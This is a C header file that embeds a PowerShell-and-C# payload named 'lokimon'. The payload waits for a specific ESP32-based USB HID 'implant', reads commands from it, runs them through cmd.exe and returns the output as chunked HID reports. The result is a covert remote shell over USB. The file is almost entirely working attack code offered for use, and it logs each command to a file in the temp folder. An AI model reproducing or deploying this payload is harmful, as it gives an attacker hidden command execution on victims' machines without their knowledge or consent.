#pragma once

constexpr const char PAYLOAD_LOKIMON[] = R"rawtxt(
@'
Add-Type -TypeDefinition @'
using System;
using System.IO;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using System.Linq;
using System.Threading;
using Microsoft.Win32.SafeHandles;
public static class HID {
static readonly string LogFile = Path.Combine(Path.GetTempPath(), "lokimon.log");
public static void WriteLog(string msg) {
string line = "[" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + "] " + msg;
Console.WriteLine(line);
File.AppendAllText(LogFile, line + Environment.NewLine, Encoding.UTF8);
}
[StructLayout(LayoutKind.Sequential)]
public struct HA {
public int Size;
public ushort VendorID;
public ushort ProductID;
public ushort VersionNumber;
}
[StructLayout(LayoutKind.Sequential)]
public struct HC {
public ushort Usage;
public ushort UsagePage;
[MarshalAs(UnmanagedType.ByValArray, SizeConst=60)] public byte[] Pad;
}
[StructLayout(LayoutKind.Sequential)]
public struct SID {
public int cbSize;
public Guid InterfaceClassGuid;
public int Flags;
public IntPtr Reserved;
}
[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
public struct SDD {
public int cbSize;
[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
public string DevicePath;
}
[DllImport("hid.dll")]
public static extern void HidD_GetHidGuid(out Guid g);
[DllImport("hid.dll")]
public static extern bool HidD_GetAttributes(SafeFileHandle h, ref HA a);
[DllImport("hid.dll")]
public static extern bool HidD_GetPreparsedData(SafeFileHandle h, out IntPtr p);
[DllImport("hid.dll")]
public static extern bool HidD_FreePreparsedData(IntPtr p);
[DllImport("hid.dll")]
public static extern int HidP_GetCaps(IntPtr p, out HC c);
[DllImport("setupapi.dll", CharSet = CharSet.Auto)]
public static extern IntPtr SetupDiGetClassDevs(ref Guid c, IntPtr e, IntPtr h, int f);
[DllImport("setupapi.dll", CharSet = CharSet.Auto)]
public static extern bool SetupDiEnumDeviceInterfaces(IntPtr d, IntPtr a, ref Guid i, int m, ref SID b);
[DllImport("setupapi.dll", CharSet = CharSet.Auto)]
public static extern bool SetupDiGetDeviceInterfaceDetail(IntPtr d, ref SID a, ref SDD b, int c, out int r, IntPtr e);
[DllImport("setupapi.dll")]
public static extern bool SetupDiDestroyDeviceInfoList(IntPtr d);
[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
public static extern SafeFileHandle CreateFile(string l, uint d, uint a, IntPtr b, uint c, uint e, IntPtr h);
[DllImport("kernel32.dll", SetLastError = true)]
public static extern bool ReadFile(SafeFileHandle h, byte[] l, int n, out int a, IntPtr b);
[DllImport("kernel32.dll", SetLastError = true)]
public static extern bool WriteFile(SafeFileHandle h, byte[] l, int n, out int a, IntPtr b);
public static SafeFileHandle FindDevice() {
Guid hidGuid;
HidD_GetHidGuid(out hidGuid);
IntPtr devInfo = SetupDiGetClassDevs(ref hidGuid, IntPtr.Zero, IntPtr.Zero, 0x12);
SID ifData = new SID();
ifData.cbSize = Marshal.SizeOf(ifData);
for (int i = 0; SetupDiEnumDeviceInterfaces(devInfo, IntPtr.Zero, ref hidGuid, i, ref ifData); i++) {
SDD detail = new SDD();
detail.cbSize = IntPtr.Size == 8 ? 8 : 5;
int reqSize;
if (!SetupDiGetDeviceInterfaceDetail(devInfo, ref ifData, ref detail, 256, out reqSize, IntPtr.Zero))
continue;
SafeFileHandle h = CreateFile(detail.DevicePath, 0xC0000000, 1 | 2, IntPtr.Zero, 3, 0, IntPtr.Zero);
if (h.IsInvalid) continue;
HA attrs = new HA();
attrs.Size = Marshal.SizeOf(attrs);
if (!HidD_GetAttributes(h, ref attrs) || attrs.VendorID != 0x303A || attrs.ProductID != 0x1001) {
h.Close();
continue;
}
IntPtr preparsed;
if (HidD_GetPreparsedData(h, out preparsed)) {
HC caps;
HidP_GetCaps(preparsed, out caps);
HidD_FreePreparsedData(preparsed);
if (caps.UsagePage == 0xFF00) {
SetupDiDestroyDeviceInfoList(devInfo);
return h;
}
}
h.Close();
}
SetupDiDestroyDeviceInfoList(devInfo);
return null;
}
public static string ReadCommand(SafeFileHandle dev) {
byte[] buf = new byte[63 + 1];
int bytesRead;
if (!ReadFile(dev, buf, buf.Length, out bytesRead, IntPtr.Zero) || bytesRead == 0)
return null;
byte[] data;
if (bytesRead == 63 + 1) {
data = new byte[63];
Array.Copy(buf, 1, data, 0, 63);
} else {
data = new byte[bytesRead];
Array.Copy(buf, 0, data, 0, bytesRead);
}
if (data[0] != 0xFF) return null;
int end = 1;
while (end < data.Length && data[end] != 0) end++;
if (end <= 1) return null;
return Encoding.UTF8.GetString(data, 1, end - 1);
}
private static byte[] BuildReport(byte ctrl, byte[] data, int offset, int length) {
byte[] buf = new byte[63 + 1];
buf[0] = 0x06;
buf[1] = ctrl;
int len = Math.Min(length, 62);
Array.Copy(data, offset, buf, 2, len);
return buf;
}
private static List<byte[]> SplitOutput(byte[] raw) {
List<byte[]> chunks = new List<byte[]>();
List<byte> current = new List<byte>();
int start = 0;
while (start < raw.Length) {
int nlPos = -1;
for (int j = start; j < raw.Length; j++) {
if (raw[j] == 10) { nlPos = j; break; }
}
byte[] line;
if (nlPos >= 0) {
int lineEnd = nlPos + 1;
line = new byte[lineEnd - start];
Array.Copy(raw, start, line, 0, line.Length);
start = lineEnd;
} else {
line = new byte[raw.Length - start];
Array.Copy(raw, start, line, 0, line.Length);
start = raw.Length;
}
if (line.Length > 186) {
if (current.Count > 0) {
chunks.Add(current.ToArray());
current = new List<byte>();
}
for (int p = 0; p < line.Length; p += 186) {
int pLen = Math.Min(186, line.Length - p);
byte[] piece = new byte[pLen];
Array.Copy(line, p, piece, 0, pLen);
chunks.Add(piece);
}
} else if (current.Count + line.Length > 186) {
chunks.Add(current.ToArray());
current = new List<byte>();
current.AddRange(line);
} else {
current.AddRange(line);
}
}
if (current.Count > 0) {
chunks.Add(current.ToArray());
}
return chunks;
}
public static int SendResponse(SafeFileHandle dev, string output) {
output = string.Join("\n", output.Split('\n').Select(l => l.TrimEnd()));
byte[] rawBytes = Encoding.UTF8.GetBytes(output);
bool truncated = rawBytes.Length > 1024;
byte[] trimmed;
if (truncated) {
trimmed = new byte[1024];
Array.Copy(rawBytes, trimmed, 1024);
} else {
trimmed = rawBytes;
}
List<byte[]> chunks = SplitOutput(trimmed);
if (truncated) {
int discarded = rawBytes.Length - 1024;
chunks.Add(Encoding.UTF8.GetBytes("...[truncated] " + discarded + " bytes discarded"));
}
if (chunks.Count == 0) return 0;
if (chunks.Count == 1 && chunks[0].Length <= 62) {
WriteLog("Chunk 1/1: " + chunks[0].Length + " bytes (SHORT)");
byte[] report = BuildReport(0xFF, chunks[0], 0, chunks[0].Length);
int written;
WriteFile(dev, report, report.Length, out written, IntPtr.Zero);
return 1;
}
int totalChunks = chunks.Count;
for (int ci = 0; ci < totalChunks; ci++) {
byte[] chunk = chunks[ci];
bool isLastChunk = (ci == totalChunks - 1);
int reportCount = (chunk.Length + 62 - 1) / 62;
WriteLog("Chunk " + (ci + 1) + "/" + totalChunks + ": " + chunk.Length + " bytes, " + reportCount + " reports");
for (int ri = 0; ri < reportCount; ri++) {
int offset = ri * 62;
int len = Math.Min(62, chunk.Length - offset);
bool isLastReport = (ri == reportCount - 1);
byte ctrl;
if (ci == 0 && ri == 0)
ctrl = 0x00;
else if (isLastReport && isLastChunk)
ctrl = 0x03;
else if (isLastReport)
ctrl = 0x02;
else
ctrl = 0x01;
byte[] report = BuildReport(ctrl, chunk, offset, len);
int written;
WriteFile(dev, report, report.Length, out written, IntPtr.Zero);
Thread.Sleep(5);
}
}
return totalChunks;
}
public static void SendReset(SafeFileHandle dev) {
byte[] report = new byte[63 + 1];
report[0] = 0x06;
report[1] = 0xFE;
int written;
WriteFile(dev, report, report.Length, out written, IntPtr.Zero);
}
}
END_INNER_HERE_STRING
[HID]::WriteLog("Waiting for implant ...")
$dev = $null
while ($true) {
$dev = [HID]::FindDevice()
if ($dev -ne $null -and !$dev.IsInvalid) { break }
Start-Sleep -Seconds 1
}
[HID]::WriteLog("Connected. Listening ...")
while ($true) {
$cmd = [HID]::ReadCommand($dev)
if ($cmd -eq $null) { continue }
$cmd = $cmd.ToLower()
[HID]::WriteLog("CMD: $cmd")
try {
if ($cmd -eq 'exit') {
[HID]::WriteLog("EXIT received, sending reset")
[HID]::SendReset($dev)
$dev.Close()
exit
} elseif ($cmd.StartsWith('cd ')) {
Set-Location $cmd.Substring(3).Trim()
$output = (Get-Location).Path
} else {
$output = cmd.exe /C $cmd 2>&1 | Out-String
}
if ([string]::IsNullOrEmpty($output)) { $output = "$?" }
} catch {
$output = "Failed to execute: $_"
}
$cc = [HID]::SendResponse($dev, $output)
[HID]::WriteLog("Response sent: $cc chunks")
}
[HID]::WriteLog("Device disconnected")
$dev.Close()
'@ -replace 'END_INNER_HERE_STRING', "'@" | Invoke-Expression
)rawtxt";
